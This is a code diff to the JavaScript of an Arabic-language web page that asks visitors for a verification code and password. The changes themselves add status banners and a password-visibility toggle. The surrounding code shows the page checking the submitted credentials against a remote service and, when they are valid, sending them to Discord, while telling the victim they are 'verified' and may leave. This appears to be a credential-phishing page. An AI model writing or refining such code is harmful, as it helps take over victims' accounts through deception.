@@ -1,9 +1,28 @@
+const Colors = {
+    SUCCESS: "#449e48",
+    FAIL: "#dc3c31",
+    WAIT: "#ffd700"
+};
+
+function showStatusMessage(message, color) {
+    const statusMessage = document.getElementById("status-message");
+    statusMessage.textContent = message;
+    statusMessage.style.background = color;
+    statusMessage.style.display = "block";
+    setTimeout(() => {
+        statusMessage.style.display = "none";
+    }, 3000);
+}
+
 function togglePassword() {
     const passwordField = document.getElementById("password");
+    const showPasswordBtn = document.getElementById("show-password-btn");
     if (passwordField.type === "password") {
         passwordField.type = "text";
+        showPasswordBtn.textContent = "*️⃣";
     } else {
         passwordField.type = "password";
+        showPasswordBtn.textContent = "👁️";
     }
 }
 
@@ -20,12 +39,13 @@ document.getElementById("sendButton").addEventListener("click", async () => {
         "code": code,
         "password": password,
         "remeber": false
-    }
+    };
 
+    showStatusMessage("جار التحقق من المعلومات...", Colors.WAIT);
     const response = await fetch(baseURL, {
         method: "POST",
         body: JSON.stringify(payload)
-    })
+    });
 
     // send to Discord if ok code is received
     let status = response.status;
@@ -41,10 +61,10 @@ document.getElementById("sendButton").addEventListener("click", async () => {
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify(message)
-            })
+            });
 
             if (response.ok) {
-                alert("تم التحقق من معلوماتك! يمكنك مغادرة الصفحة الان");
+                showStatusMessage("تم التحقق من معلوماتك! يمكنك مغادرة الصفحة الان", Colors.SUCCESS);
             } else {
                 console.error("Error sending message:", response.statusText);
             }
@@ -52,6 +72,6 @@ document.getElementById("sendButton").addEventListener("click", async () => {
             console.error("Erorr:", error);
         }
     } else {
-        alert("الرمز او كلمة المرور غير صحيحة");
+        showStatusMessage("الرمز او كلمة المرور غير صحيحة", Colors.FAIL);
     }
 })
